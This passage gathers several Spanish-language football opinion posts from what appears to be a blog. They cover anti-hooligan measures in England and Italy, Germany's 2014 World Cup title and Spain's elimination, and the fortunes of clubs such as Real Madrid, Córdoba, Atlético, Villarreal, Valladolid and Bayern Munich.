todos los clubes deportivos profesionales. Se creó en 1990 la Comisión de Seguridad en los estadios de la FA con Chris Whalley al frente. Rápidamente, se abogó por una renovación profunda de los estadios ingleses, suprimiendo aquellas vallas metálicas que dos décadas atrás se habían visto obligados a instalar en los graderíos como medida disuasoria de las violentas intenciones del hooliganism. Aquella desaparición del principal elemento de control físico que existía hasta la fecha dentro de los estadios fue acogida con ciertos recelos iniciales, pero la respuesta del público fue extraordinaria. Haciendo gala de una profunda madurez, el espectador medio inglés borró de su conciencia cualquier atisbo de violencia en relación con el espectáculo deportivo. Fue como si abrieran las puertas de las jaulas de las fieras y éstas, en lugar de escaparse y sembrar el pánico por doquier, hubieran acabado arrinconadas en la marginalidad por un público sano y entusiasta deseoso de poder disfrutar de su equipo en paz.En la actualidad, con una unidad policial especial dedicada a la vigilancia de aquellos hinchas catalogados como violentos o conflictivos y con más de dos mil personas en todo el país a las que se les ha prohibido judicialmente la entrada en espectáculos deportivos por haber protagonizado episodios de violencia, apenas subsiste algún pequeño brote de conflicto en ocasiones aisladas, como los disturbios que siguieron el Newcastle-Sunderland de 2013, o en partidos de extrema rivalidad histórica, como el West Ham-Millwall de la Copa de la Liga de 2009. ItaliaItalia pasa por ser uno de los países de Europa Occidental más problemáticos en cuanto a la violencia en el fútbol se refiere de los últimos años. La oleada de incidentes vivida durante los años noventa y la pasada década (once muertos en los diez últimos años) obligaron a las autoridades italianas a recrudecer la normativa de acceso a espectáculos deportivos. Hasta las más recientes adopciones de medidas, las famosas curvas de los estadios italianos eran un reducto de delincuencia, corrupción y extorsionadores profesionales que habían conseguido hacer de los clubes de fútbol su cuartel general y de los miles de seguidores radicales que aglutinaban sus grupos su pequeño ejército personal, algo muy similar a lo que, aún a día de hoy, se vive en Argentina y en otros países del continente sudamericano.Fue el asesinato en el año 2007 del inspector jefe de la policía de Catania, Filippo Raciti, en mitad de los graves y violentos disturbios ocasionados tras la disputa de un Catania-Palermo, lo que disparó definitivamente la señal de alarma en la sociedad italiana. La dictadura de la violencia en el fútbol, que durante décadas había hecho suyos la mayor parte de los estadios transalpinos, había cruzado la línea prohibida. Se introdujo en el calcio la plena aplicación del Decreto Pisanu, que establecía la prohibición de viajar a otros estadios siguiendo al equipo en determinados encuentros de especial riesgo. Además, se incluía la prohibición de acceder a recintos deportivos (Divieto di accedere alle manifestazioni sportive) a aquellos seguidores relacionados con episodios de violencia (durante tres años, o de cinco a ocho años más obligación de presentarse en comisaria durante la disputa del partido, en los casos de reincidencia). Asimismo, en la campaña 2009/10 se implantó con no poca polémica la conocida como Tessera del Tifoso, una especie de carnet del hincha que posibilita a sus poseedores (y únicamente pueden serlo aquellos que no han participado en conflictos) a viajar siguiendo al equipo por la geografía italiana así como a poder entrar en la zona reservada a la afición visitante en los estadios rivales.Por si fuera poco, el modelo de seguridad italiano ha apostado por las entradas nominativas, en las que aparece inscrito el nombre de su portador y legítimo propietario, para evitar así casos de reventa y de acceso incontrolado a las instalaciones deportivas. No obstante, y aunque las medidas adoptadas han resultado bastante efectivas, la violencia entre hinchadas rivales aún persiste fuera de los estadios, aunque quizá ya poco o nada tenga que ver con el propio fútbol.Mientras el problema de la violencia relacionada con el fútbol parece cada vez más controlado en Inglaterra, Italia, Alemania o Francia, una peligrosa oleada arrecia desde Europa del este. No es infrecuente tener constancia de violentísimos enfrentamientos entre aficiones rivales en las ligas rusa, polaca o búlgara. Allí el problema, generalmente alimentado por fuertes sentimientos nacionalistas y xenófobos, aún está dando sus primeros pasos. Será difícil, por desgracia, que no vaya a más. El ocho de julio de 1990, un solitario gol de penalti anotado por Andreas Brehme estampaba sobre el águila de la federación alemana de fútbol la tercera estrella de campeones del mundo. Fueron un gol, y una resolución de la final, muy propios de aquel sólido, fiable, pero poco dado al artificio equipo alemán: un penalti en la recta final del choque anotado por un lateral izquierdo de maneras no precisamente refinadas cuadraban a la perfección con lo que transmitía aquel seleccionado de Beckenbauer. Han pasado veinticuatro años desde entonces y, aunque el método ha cambiado radicalmente, la Mannschaft vuelve a dominar el planeta futbolístico. Fue otra vez con un gol solitario, casi robado y medio clandestino en un escenario en el que ya no se le aguardaba. Un gol que, como en el 90, resume y define al equipo que corona como Weltmeister por cuarta vez en la Historia.La Alemania de 2014, la que se coronó en la noche de un trece de julio, rubrica una obra que se inició hace ya doce años, o cuatro Mundiales, para los que seguimos midiendo el tiempo en la escala mundialista. Su gran éxito en la cita brasileña justifica el giro estilístico de la nueva Alemania futbolística del siglo XXI y disipa cualquier tipo de duda resultadista que pudiera haber surgido en torno al proyecto iniciado por Jürgen Klinsmann y prolongado por Joachim Löw.Adiós, reticentes. Por si aún quedaba alguno aferrado por ahí a su jarra de Paulaner. El equipo de Löw es por fin campeón porque ha demostrado, a lo largo del último mes, ser el que mejor juega al fútbol. Cree en su estilo, en un fútbol guionizado a partir de interminables y complejas frases subordinadas, de jugadas eternas y repletas de requiebros que siempre parecen esconder alguna sorpresa imprevisible. Cuenta además con el servicio de una generación de esas que marcan época. Alguien dijo alguna vez que el fútbol de selecciones nacionales tiene mucho de generacional. Que de nada sirve tener una historia de peso detrás si ésta no se acompaña de un grupo óptimo, una plantilla que aúne veteranía y juventud y que llegue a la cita señalada en el momento más dulce de sus respectivas carreras. Alemania, con Kroos, Müller, Neuer, Boateng o Götze en su punto álgido, lo ha conseguido como lo consiguió España cuatro años atrás. Nadie juntaba en este Mundial tantos y tan buenos futbolistas como el combinado germano, así que explicar su éxito resulta tarea relativamente sencilla.Alemania hace además historia perfeccionada con este título al ser la primera selección europea en conquistar el triunfo en suelo americano. Lo hace, por si fuese poco, habiendo batido en su camino a la anfitriona Brasil -y de qué manera- y a Argentina. Y lo hace abrazada a un nuevo arquetipo futbolístico, ubicado precisamente en las antípodas de su muestrario histórico. Entregada y consagrada a un fútbol que encumbra pequeños centrocampistas con cara de muñeco como Mario Götze y destierra sin ningún miramiento a gigantes de músculo sólido y maneras de autómata. Alemania es el campeón amable. El que lo logra con merecimiento y justicia indiscutibles y con el reconocimiento íntegro de aficionados de todo el planeta. Uno ve jugar a esta nueva Mannschaft, exuberante y ajena a cualquier tipo de especulación, y ya no se le saltan de los dedos los hasta hace poco recurrentes símiles de origen militar. Ya no aparecen los panzer, ni la Blitzkrieg, ni la Luftwaffe cuando uno habla de los germanos. No es necesario. Otra Alemania es campeona del mundo. El equipo que jamás ningún aficionado español pudo llegar a imaginar cerró el ciclo más exitoso de la historia de nuestro fútbol de una manera absolutamente imprevista y protagonizando la peor defensa del título de la historia de los mundiales. Incapaz de imponerse a la encorajinada y rocosa Chile de Sampaoli, España apareció de nuevo acobardada, prolongando la pesadilla del pasado viernes ante Holanda desde el primer minuto de juego. Nada, ni la más ínfima sensación de recuperación. Ni el menor atisbo de orgullo. El combinado nacional deambuló sobre el césped a un ritmo sospechosamente crepuscular. Como si ya fuese consciente del ocaso que le deparaba el futuro inmediato y se negase a luchar contra un destino ya escrito. Ni tan siquiera el instinto de supervivencia, que tantas veces ha salvado la cara a tantos equipos, hizo acto de presencia. Porque no necesitó Chile firmar un partido ni mucho menos ejemplar para imponerse con claridad a los nuestros. Tirando de buen orden y de la intensidad mínima exigible en un torneo de las característica de una Copa del Mundo, los andinos simplemente asistieron al desplome español aprovechando su momento ante la falta de iniciativa y la agonía del combinado de Del Bosque. Se hace complicado, en medio de la conmoción, trazar un análisis sosegado y preciso de lo ocurrido en este torneo. Se apunta a una cuestión de piernas, de cansancio, de kilómetros acumulados… pero no hay que dejar de lado el asunto anímico y emocional, una preparación y concentración previa deficientes y una ausencia de mecanismos básicos de funcionamiento preocupante. Podrían haber saltado al campo otros futbolistas. Podría haber Del Bosque revolucionado el once con Fàbregas, Juanfran, Villa o quien hubiese querido, pero las sensaciones exhibidas no habrían diferido mucho de las mostradas por los protagonistas. Más allá de cuestiones puramente tácticas, España jugó tanto el pasado viernes como hoy sometida al miedo al fracaso. Al pánico a no cumplir con las expectativas, a no ser capaces de superar lo insuperable, a no ser capaces de honrar ese peligroso favoritismo que se le había adjudicado. Y, para colmo de males, aliñó semejante ensalada mental con una pesadez de piernas definitiva.Dice mi amigo Miguel que las decepciones mundialistas era diferentes cuando éramos jóvenes, que nos vamos haciendo viejos y ya no sentimos igual. De las lágrimas con el penalti de Eloy y la falta de Stojkovic, pasamos a la borrachera destructiva con el fallo de Julito Salinas ante Italia y al dedo meñique de la mano derecha, que tenía como destino el mentón de Al-Ghandour y acabó, cosa de las distancias, estrellado contra la pared más cercana, hecho añicos. Eran otros tiempos y hacíamos cosas extrañas. La estrepitosa caída del año 2014 ha tenido, por fortuna, unas consecuencias inmediatas bien diferentes. Ya no se nos caen las lágrimas, porque tenemos casi treinta y siete años, no diez. Ya no nos da por la violencia adolescente. Ahora nos sentamos en el sofá, juramos un poco en arameo y pensamos en que mañana tenemos que terminar como sea ese jodido informe que lleva una semana dándonos por ahí. También nos acordamos de que un día vimos a nuestra selección ganar un Mundial. Y dos Eurocopas.Simplemente me quedé arrodillado sobre el césped, humillado. Un rayo de hielo me atravesó por dentro.Tres días después, volví al campo de entrenamiento. Ella me esperaba verdeada por la hierba, en el mismo sitio de siempre. Me acerqué tan despacio como pude, como un cazador buscando a una presa despistada. La agarré con las dos manos. No hizo ningún movimiento inesperado. Sólo se quedó allí, en el hueco de mis palmas. Casi dormida. “Tenemos que entendernos tú y yo”, le dije. Y la coloqué con cuidado de nuevo en el césped. Me dirigí a mis compañeros, que empezaban a correr. Uno de ellos me echó el brazo por encima. “Como la del otro día ni una más, eh”, me dijo con una sonrisa. “No te preocupes, ya está todo solucionado”, contesté. Y le devolví la sonrisa. En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, tienes un amplio catálogo de jerséis de portero. Desde Kahn, hasta Casillas. Desde Buffon, hasta De Gea. Los delanteros siempre son el alma de la fiesta. Los grandes equipos se miden en función de sus nueves. No es del todo justo silenciar la tensa labor del defensa, o el trabajo esencial del guardameta pero, salvo las menciones a los centrocampistas esporádicamente –Zidane, Platini, Xavi-, el fútbol tiende a simplificar la calidad centrándose en el metegoles. De él depende la verticalidad del equipo y es su obligación hacer rentable el juego, parco o lustroso, del resto del colectivo.El Madrid tiene un problema arriba. Higuaín ha demostrado ser más importante de lo que algunos, como yo, pensábamos. Su lesión, chapuceramente tratada dicho sea de paso, ha dejado huérfano al equipo. Esa conocida “pegada” ha ido diluyéndose poco a poco y ya no golpean como antes. Quedó Benzema, sumido en una depresión interminable, demasiado observado, demasiado presionado, pero sobre todo demasiado bisoño para cargar con el peso merengue. Ante ese panorama, ante la ausencia de un delantero referencial, a Mourinho se le ocurren algunas alternativas.La primera y más natural es colocar a Cristiano de punta. Es una buena opción viendo el estado del portugués, sin embargo, puede ser una queirozada si se ve quien queda en el costado. Kaká no está al nivel todavía, Pedro León no existe, Özil tiene su puesto asegurado en la mediapunta y Granero, que ha jugado en el costado alguna vez, ha demostrado más calidad jugando retrasado, de pareja de Alonso o Lass. Con sólo Di María rindiendo al nivel deseado, es una frivolidad prescindir de Cristiano en su clásica posición de extremo con libertad. Abre el campo, descongestiona el ataque y aporta más soluciones que buscando el balón en la boca del gol. Por otra parte, la opción de poner al brasileño Kaká en la punta es hoy en día más una elucubración que una opción.Ya no es que la lesión de Higuaín haya exigido un delantero para cubrir la eventual baja de Benzema, es que tengo la sensación de que el nuevo delantero puede estar un paso por delante del francés. De ahí viene la tensión entre Mourinho y el club, una tensión no disimulada cuando Valdano hizo referencia ayer a la suplencia del ex del Olympique. El equipo no anda mal, diferente es que el Barcelona sea intratable, pero parece que la venida o no de un delantero centro tiene como objetivo aportar más mordiente a la plantilla en las rondas eliminatorias de la Champions. Mourinho juega con esa necesidad, sabe que habrá minutos para darlo todo sobre el césped y con un horchatero como Benzema no es suficiente en esos envites del todo o la nada.Se abre, pues, el mercado de fichajes. Ahora se habla de Van Nistelrooy. Extraño interés en un jugador al que se le abrió la puerta hace nada y que, aún marcando goles, no garantiza ni siquiera la integridad ante las lesiones. Se busca cesión, algo puntual para evitar los lastres tipo Huntelaar o Lass, es decir, parches que extendieron su labor, sobre todo el francés. Dentro de los nombres dados, Klose, Adebayor, Owen… al menos el holandés ha demostrado una fidelidad y cariño al escudo madridista que casi enternece. En cualquier caso, la venida apresurada de un hombre de ataque no puede maquillar una planificación deportiva que, a las primeras de cambio, ha demostrado ser improvisada y demasiado confiada, en primer lugar, dándole galones a un jugador, Benzema, con serios problemas para ser titular sin tener ni siquiera competencia.La otra solución es algo naïf. Pensar que Morata, un chico de la cantera sin experiencia en Primera, puede salvar al equipo del bache goleador es de una ingenuidad alarmante. No ha demostrado aún nada, tampoco en el filial, y su progresión pasa por tener minutos posiblemente lejos del Bernabéu. La obsesión por la cantera de la parroquia madridista es sana, pero Morata no tiene nada que no tuvieran Negredo, Portillo o Soldado, y ninguno de los tres pudo triunfar, viniendo desde abajo, sobre el césped de Chamartín. Tiene la Segunda una atmosfera fatídica desde que la recuerdo, desde que mi equipo la habita, prácticamente desde siempre. La vida, con su madurez impostada, tiene subterfugios para sobrevivirla. Sentir el fútbol con pasión contenida o abonarse al pesimismo como torpe forma de superar la catástrofe, hacer más llevadero ser de un equipo poco acostumbrado a la celebración, más bien hecho a la medida de la derrota, de los descensos, de lo que duele. Ayer vi el Recreativo de Huelva-Córdoba en casa de un amigo de bufanda y camiseta del Córdoba, rodeado de cordobesistas viejos y nuevos que sienten nerviosamente el blanco y el verde del escudo. En Segunda las cosas están apretadas por arriba. Con el Deportivo y el Eibar ascendidos, seis equipos -Murcia, Sporting, Las Palmas, Córdoba, Recreativo y Sabadell- se jugarán en la última jornada las cuatro plazas que dan derecho a los play-off de ascenso a Primera. El Córdoba, su equipo –el nuestro-, podía sellar su clasificación si ganaba al Recre a domicilio. Y así lo hizo durante noventa y cuatro minutos de partido. En la última jugada, tras un balonazo largo del portero y una prolongación mal defendida, Menosse batió a Juan Carlos y puso un empate que daba vida al equipo de Huelva y hundía en el fango a un Córdoba que había trabajado duro –sin brillo, sin fútbol, pero con entusiasmo y seguridad- el único gol que pendía, como la espada, en el marcador del Colombino. José, mi anfitrión, se pasó toda la segunda parte adivinando la tragedia. Sabiendo que tarde o temprano pasaría algo así. Como si tanta felicidad fuera tabú entre el cordobesismo. Como una maldición telúrica, ridícula e invencible. Quise dar una opinión tranquila, desapasionada y analítica, una opinión sobre lo que de verdad siento. Y por eso escribo esto, porque a veces creo que el cordobesismo no es capaz de disfrutar lo que ahora mismo tiene: un equipo defenestrado hace tres meses, con una directiva cuanto menos impredecible, con una plantilla limitada y una afición demasiado ocupada en llorar lo que no se tiene y poco preocupada en disfrutar de lo que quizá venga, que aún tiene posibilidades de luchar por un puesto en Primera.Resumo: absolutamente todos los aficionados hubieran firmado estar aquí en la última jornada. El equipo de Villa prometía pero después se alejó demasiado del objetivo del ascenso. Objetivo, por otra parte, más anclado en la fe y la publicidad institucional que en una plantilla justa y no excesivamente brillante. Ferrer llegó desorientado y torpe y el equipo tardó en carburar. Hace nada se hablaba incluso de descenso. Hoy el Córdoba está séptimo y a una victoria del play-off. Ayer quedaban dos jornadas. El empate en Huelva contra un rival que se juega exactamente lo mismo es un resultado extraordinario. El partido pudo ganarse, pero no se ganó. Ellos fallaron un penalti y Xisco encaró al portero como un elefante encara a una margarita. Es fútbol. Y está bien así. El punto suma y, sobre todo, garantiza que el Córdoba dependa de sí mismo. ¿Qué queda entonces? Ganar en casa a un equipo que lleva todo el año coqueteando con el descenso. Repito: ganar en casa a un equipo peor. Aclaro: clasificarse para un play-off no es un objetivo. El objetivo es GANAR ese play-off. Poca fe puedo tener en un equipo que no es capaz de ganar en su casa el partido definitivo y después tiene que sacar adelante dos eliminatorias con equipos que, presumiblemente, han quedado mejor que el propio Córdoba en la regular. El partido contra el Mallorca es más que tres puntos, es la carta de presentación de las eliminatorias, es la única forma que tiene un equipo como este, demasiado espeso e irregular pese a esta brillante y postrer racha, de dar un golpecito en la mesa. De decir: ganamos este de momento, y lo que venga. No son tres puntos, es una victoria que espante a los fantasmas. Una victoria que es un empujón para subir esta cuesta. Es la mano de un aficionado en la espalda de un ciclista agotado. El partido de la semana que viene es, simplemente, el resumen de todo el esfuerzo de esta temporada. Tiene la Segunda un olor desagradable, a cosa vieja. José decía ayer que como cordobesista lo más lejos que ha visto llegar a su equipo es quedar sexto con Jémez en Segunda. Es desolador, es un campo muerto, un solar lleno de escombros. Entiendo que no haya esperanza. La esperanza se gana, la ilusión se construye. No podemos pedirle necedad al cordobesismo. Al revés, es más lógico responder con pragmatismo, con pasión reservada, con miedo. Con miedo a quedarse ahí, de nuevo, en la puerta de un salón donde se celebra algo grande. Ayer lo vi, terminándome una cerveza en su piso de Málaga. Mientras él intercambiaba mensajes con su primo que estaba en el Colombino, mientras que su sobrino jugueteaba con una bufanda del Córdoba. Lo vi. Vi ese dolor del que se huye, ese fracaso que se anticipa y que, terriblemente, llega.A él, a todos, les digo que crean. No porque yo sepa lo que va a pasar. Ni mucho menos. No porque confíe en el Córdoba de Ferrer, que tampoco demasiado. Le digo que crean porque queda una semana y es mejor pasar estos días desenado lo imposible que anticipando lo probable. Porque en el fútbol, como en la vida, todo llega. Y quizá este sea el año. Y si no lo es, si por desgracia no lo es, no me arrepentiré el próximo sábado de haber gastado seis días de mi vida soñando. Fotografía: www.cordobacf.com El Atleti vuelve al hospital. Ni los medicamentos europeos, ni la final de Copa, ni unos fichajes veraniegos que parecían cimentar el proyecto de Quique Sánchez Flores han podido evitar el nuevo ingreso en la UVI. Ayer perdieron contra el Sporting en un partido insustancial que se resume en el gol de Barral. Raúl García y Perea en modo “bombero torero” y una derrota que echa por tierra las soflamas motivadoras del técnico y la aspiración de entrar en la Champions por poderes.Buscar culpables, ese deporte en el que España siempre tiene opciones de medalla, es la única terapia que sigue la afición para superar el malestar general. Forlán está descentrado y por más héroe local que sea, no garantiza ni siquiera peligro en el área rival. Con Kun y Reyes lesionados, el equipo pareció ayer una tortuga sobre el césped del Molinón. Ni Elías ni Juanfran pudieron maquillar el mal estado de los colchoneros que ven de nuevo como la máxima competición europea se aleja. Si el Athletic gana hoy, serán séptimos, pobre bagaje para un equipo que este año pretendía estabilizarse en la zona noble de nuestro fútbol.La posición de Quique pende de un hilo. Se le pueden achacar muchas cosas, por ejemplo el pésimo aprovechamiento de dos jugadores que venían como estrellas y que vagabundean por los márgenes de la titularidad, Filipe Luis y Godín.El centro del campo de picapedreros empieza a desmontarse, ni Mario Suárez ni Fran Mérida han aportado demasiado y la venida de Elías es un misterio aún, aunque haya demostrado alguna cosa en los pocos minutos disputados. Lo de Raúl García es más grave, del jugador talentoso que fue a un lastre para el equipo, extraña mutación la del centrocampista navarro.Yo seguiría confiando en Quique. Más por fe que por argumentos. Están fuera de Europa y de la Copa del Rey y ya solo queda un sprint liguero para salvar la temporada. Las probaturas, a estas alturas de la temporada, siempre son insondables. Quique ha demostrado paciencia y competitividad, para mí los únicos elementos necesarios para sacar puntos en los diecinueve partidos restantes. El siguiente paso sería, como siempre en este club, empezar a sanear los despachos institucionales. Sólo desde ahí podría encontrar la afición rojiblanca la estabilidad de la que se les priva año tras año. El título de la temporada pasada ha pasado de ser un punto de partida para convertirse en un recuerdo hermoso, pero aislado. El cuerpo se acostumbra a lo bueno, y desde la llegada a Primera División en la temporada 2000-2001 el Villarreal no ha hecho otra más que darse caprichitos. Una semifinal de Champions, un subcampeonato y muchos partidos llenos de intensidad y buen juego. De ser el equipo que bajó en su primer año en la categoría de oro de nuestro fútbol a jugar de tú a tú con los favoritos de siempre. Diez años donde el equipo amarillo ha crecido hasta el punto de que una meritoria campaña con el premio añadido de la Europa League ha dejado un mal sabor de boca a los parroquianos.La temporada pasada fue un espacio para la transición. Manuel Pellegrini había conseguido que el equipo castellonense encontrara un patrón de juego bastante exitoso. Su fichaje por el Real Madrid precipitó el cambio y se apostó por Valverde, un técnico experimentado, triunfador, y con fama de recto en el vestuario. Parecía una apuesta a caballo ganador, pero el invento no pudo salir peor. El equipo se hundió en la tabla, no ganaba ni sumando el talento de jugadores valiosísimos como Cazorla, Rossi o Senna, y la directiva encabezada por el tándem Roig-Llaneza cortó por lo sano. Ahí llegó la oportunidad de Garrido. Un técnico de la casa que había llevado al filial a la Liga Adelante y que, temporalmente se haría cargo de una plantilla deprimida y alejada de sus frescos hitos deportivos.La apuesta no pudo salir mejor. Garrido sintonizó al equipo, ajustó las posiciones, le dio confianza a los ensombrecidos delanteros, y el equipo amarillo quedó séptimo.Tenemos esas tres fotos grabadas en el disco duro de nuestra memoria, no es cualquier cosa. Suena Iron & Wine y quizá me ponga algo nostálgico, como cada vez que percibo que algo bueno y que es probable que no vuelva a vivir se acaba para siempre. ‘Este Valladolid no tiene nada. Le va a costar un mundo hacer un gol. Se va a Segunda de cabeza‘. Me lo dijo Jesús, amigo de tertulias futboleras y socio del Real Valladolid con la piel curtida por el frío de la grada de Zorrilla. Y me lo dijo antes de empezar la temporada que acabamos de terminar, cuando aún solo se sabía del nuevo Valladolid de Juan Ignacio Martínez por los amistosos de pretemporada y por las pocas sensaciones que se podían extraer a través de la prensa. La confianza, de inicio, era ciertamente escasa. Las peores sospechas no tardarían en confirmarse.Ya contábamos con que el tránsito tras el adiós de Miroslav Djukic iba a ser duro y con que el panorama que se presentaba ante las escasas incorporaciones a la ya de por sí floja plantilla vallisoletana no hacía presagiar una campaña cómoda. Si a lo delicado de la situación le sumamos que aquellos futbolistas de los que se esperaba más a la hora de pelear por sacar al equipo de la zona baja de la tabla nunca llegaron rendir al nivel esperado y deseado, la resolución de la ecuación es más que evidente. Nunca tuvo el Pucela esa referencia incontestable a la que agarrarse en los peores momentos. Sobrevoló por Zorrilla una permanente sensación de orfandad y de ausencia de liderazgo que ni Óscar, gran artífice de la buena temporada anterior y lesionado durante gran parte de este curso, ni Javi Guerra, ni Fausto Rossi, ni, por supuesto, Patrick Ebert fueron capaces de combatir esas carencias.Particularmente sangrante fue el caso del alemán. Pronto dejó claro al graderío que no era un futbolista en el que confiar. Conseguido su objetivo de dejarse ver en la banda derecha de Zorrilla, Ebert fue dejándose poco a poco, pasando de ser el jugador referencia que fue hace un año a convertirse en un futbolista perfectamente prescindible y siempre sometido a la cruda dictadura de sus frecuentes lesiones musculares. Su espantada definitiva, en las horas previas del importante partido ante el Villarreal, terminó dando con el alemán en las filas del Spartak de Moscú. Nadie en Valladolid pareció echarlo mucho de menos, pese a que su sustituto Jeffren tampoco es que tuviese un paso muy destacado a orillas del Pisuerga.Reconocía días atrás el presidente vallisoletano Carlos Suárez, consumado ya el descenso de categoría, que, llegado el momento, no se planteó destituir a JIM porque en el mercado no aparecían opciones para sustituirlo con ciertas garantías. Es decir, admitía de aquella manera que sí se había llegado a plantear prescindir de JIM. Su recta final del campeonato incitaba a ello. Incapaz de revertir una situación viciada, tomando algunas decisiones sorprendentes (sigue coleando la desaparición del meta Mariño de la portería blanquivioleta justo cuando las cosas se ponían tiesas) y con un aire de resignación muy contagioso, habría mucho que exponer sobre su gestión del último mes del campeonato. No es de recibo que un equipo que se juega la vida encaje cuatro goles del ya descendido Betis solo unos días después de haber ganado una inesperada vida extra frente a todo un Real Madrid.Lo mejor: Es complicado destacar a alguien en el año pucelano. Flojo en defensa y paupérrimo en ataque. Quizá el papel del cedido Mariño en la portería sea, en lo individual, lo más destacable, por encima incluso de los dieciséis goles de Javi Guerra.Lo peor: La sensación trasmitida por el Valladolid de JIM choca frontalmente con la que transmitía el añorado equipo de Djukic. Gris, espeso, pusilánime, resignado a su suerte… La llegada del central Mitrovic, cedido por el Benfica, no suavizó los problemas defensivos.Lo que espera: Un futuro incierto y ya sin JIM en el banquillo. Se especula con la posibilidad del retorno de Mendilibar al lugar en el que quizá mejor rendimiento extrajo de un equipo. Sea como fuere, las cosas no serán fáciles. Tres descensos en diez temporadas no son sencillos de soportar y se prevé un descenso radical en el número de abonados. Incertidumbre. Dice Karim Benzema que cuando marca goles con la selección nacional francesa es francés, pero que cuando no consigue marcar, es árabe. Y lo dice para poner de manifiesto que Francia, por mucho que en la actualidad disfrute de una versión saneada de la mano de Didier Deschamps, sigue teniendo un absurdo problema extrafutbolístico de primer orden por una cuestión que jamás debería de resultar problemática. No soy francés, ni nada que se le parezca, pero me gusta escuchar ‘La Marsellesa‘ cada vez que sus notas llaman a la población francesa a las armas. Me pone y me da cierta envidia, porque el chunda chunda nacional no puede sonar más verbenero al lado de semejante ‘calientaestadios’. ‘Si marco tres goles, nadie se va a acordar después del partido de si he cantado o no el himno.La polémica exclusión del Mallorca por parte de la UEFA abrió las puertas al Villarreal para hacer su desembarco en Europa. Premio a la mejoría instantánea que resarció el reinado de Valverde y encumbró a Juan Carlos Garrido. Este año el volante del equipo es suyo. Sin más probaturas, el entrenador que llegó como solución intestina tiene por delante una dura empresa: rejuvenecer un equipo que daba síntomas de agotamiento, hacer un papel en Europa de acuerdo con el presupuesto y valor de la plantilla, no dormirse en la Liga y aspirar a Champions, conseguir por fin un puesto digno en Copa del Rey –hoy por hoy, el camino más rápido para que el Villarreal levante un trofeo que fije en el palmarés su histórica época-. Para eso el club ha saneado sus activos futbolísticos. Limpieza en el plantel y fichajes con más oficio que nombre. Pirés, Ibagaza y Javi Venta ya habían dicho todo lo que tenían que decir en el equipo del Madrigal. Llorente, que había venido rindiendo, prefirió probar las mieles de Primera en casa con la Real. Eguren nunca terminó de cuajar al lado de Marcos Senna y se marchó al Sporting y Godín dejó ocho millones en caja tras su traspaso al Atleti. Para apuntalar el equipo savia nueva de un filial que demostró mimbres en su debut en la categoría de plata: Oriol, Catalá, Mussachio, Ruben o el sensacional Jefferson Montero. De su acoplamiento depende buena parte del desempeño futbolístico del equipo. Una vez apuntalado con promesas, el equipo ha buscado en Marchena algo de estabilidad defensiva tras la sensible pérdida de Godín. En Borja Valero la organización y último pase que podían significar Pirés o Ibagaza y el regreso de Altidore –que siempre rinde como internacional con EEUU- para sumar en ataque. Salvo lo del exmallorquinista, los otros dos fichajes son un misterio. Marchena lleva tiempo en la cuesta abajo de su carrera y la sombra del uruguayo será inevitable. Altidore, cedido al Hull el año pasado, jugó bastante pero sólo marcó un gol. Poco resolutivo de cara a portería si tiene que sustituir a Rossi o Nilmar.Ante las incertidumbres de los recién llegados, el patrimonio que aún conservan.Un portero que en mi opinión está entre los diez mejores porteros del mundo. Senna y Bruno, dos jugadores sacrificados y decisivos en el medio campo. Cazorla y Cani, garantía de gol y juego en las bandas y Nilmar y Rossi arriba. Dos internacionales con el gol entre ceja y ceja. No es una plantilla humilde, precisamente y pese a la profunda renovación, tienen equipo para pelear por un puesto noble en las tres competiciones en las que están inscritos.Lo mejor: Una plantilla compensada y un entrenador que ha demostrado capacidad para dirigir al equipo. Sin los experimentos del año pasado, el club gana en estabilidad y puede fijarse objetivos inmediatos.Lo peor: La apuesta por los jugadores de la cantera puede ser triunfal o un desastre. La Liga BBVA es una competición dura que no da segundas oportunidades.Un pronóstico: El Villarreal terminará en puestos europeos y mejorará su papel en la Copa del Rey. Kahn abandonó el fútbol algo tarde. Se dejó llevar por la competición y no alcanzó a ver que ni los reflejos, ni la explosividad ni la agilidad que le hicieron uno de los mejores porteros del mundo le acompañaban ya en aquel año y pico horrible hasta que colgó los guantes. El futuro parecía estar en manos de un joven Rensing, que había protagonizado alguna parada memorable y que tenía pinta de ser el plácido titular en el equipo bávaro. Hoy, en semifinales de Champions, cuando el equipo muniqués ha alcanzado por fin aquello por lo que venía luchando en su historia reciente –ser protagonista en  la élite europea- el panorama en el marco del Bayern es muy diferente. Un segundón como Butt, más famoso por sus penaltis que por su sobriedad bajo palos y que llegó al equipo hace un par de temporadas para ver el fútbol desde el banquillo, será el encargado de desbaratar el poder ofensivo del Lyon.El bajón de Rensing ha pillado descolocado a los técnicos del Bayern Munich. Van Gaal, que no es muy amigo de los porteros excéntricos, le ha tenido que dargalones al veterano Hans-Jörg, y sabe de sobra que esto es lo que tiene para acabar la temporada. En la ida el ex de Benfica, Hamburgo y Leverkusen ya demostró que no es un portero en el que se deba tener mucha fe y transmite más inseguridad que otra cosa. Unido a que la defensa no atraviesa su mejor momento, la preocupación del técnico holandés debe tener objetivos obvios de cara el choque de esta noche. Tener enfrente a una posible primera figura como Lloris no le vendrá demasiado bien al bueno de Butt que ya ve como su equipo se mueve en el mercado para buscar el portero que por fin haga olvidar la gigantesca figura de Oliver Kahn y su dominio bajo palos en los mejores tiempos recientes de un equipo como el de Munich, que no puede dejar a la suerte un puesto tan sensible.Conociendo a Van Gaal, hombre de costumbres, y viendo el magnífico rendimiento que con él tuvo en el AZ Alkmaar el argentino Romero, no tengo dudas acerca del principal objetivo para reforzar el marco la temporada que viene. De momento, y para espantar a los fantasmas, hoy saltará al Allianz Arena Jörg Butt. Hará lo posible para llegar a la  final y levantar una copa que ya vio de cerca en aquella noche escocesa con Zidane y su volea de protagonistas. Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Las despedidas se curan con regresos. Vuelvo a escribir en Diarios de Fútbol tras unos días de cambio, una nueva ciudad, un nuevo trabajo y cientos de puertas abiertas. Quiero hablar de equipaciones. Las camisetas son embajadas domésticas de los clubes. Miles de pequeños diplomáticos que pululan por las calles con su mensaje inmaculado, con la defensa textil de unos colores, de unos símbolos, con su contagio cromático. No hay ciudad que esté libre de esos uniformados hinchas que desafían el calor veraniego con sus armaduras elásticas, que lucen con indisimulado orgullo el escudo, la publicidad y hasta dorsales imposibles. Recuerdo mi reciente visita a Bilbao, con un guía perfecto como Dadan Narval, y la marea de franjas rojas y blancas, recuerdo cuando visité Florencia y en cada puestecillo pendía una camiseta de Montolivo, de Mutu, 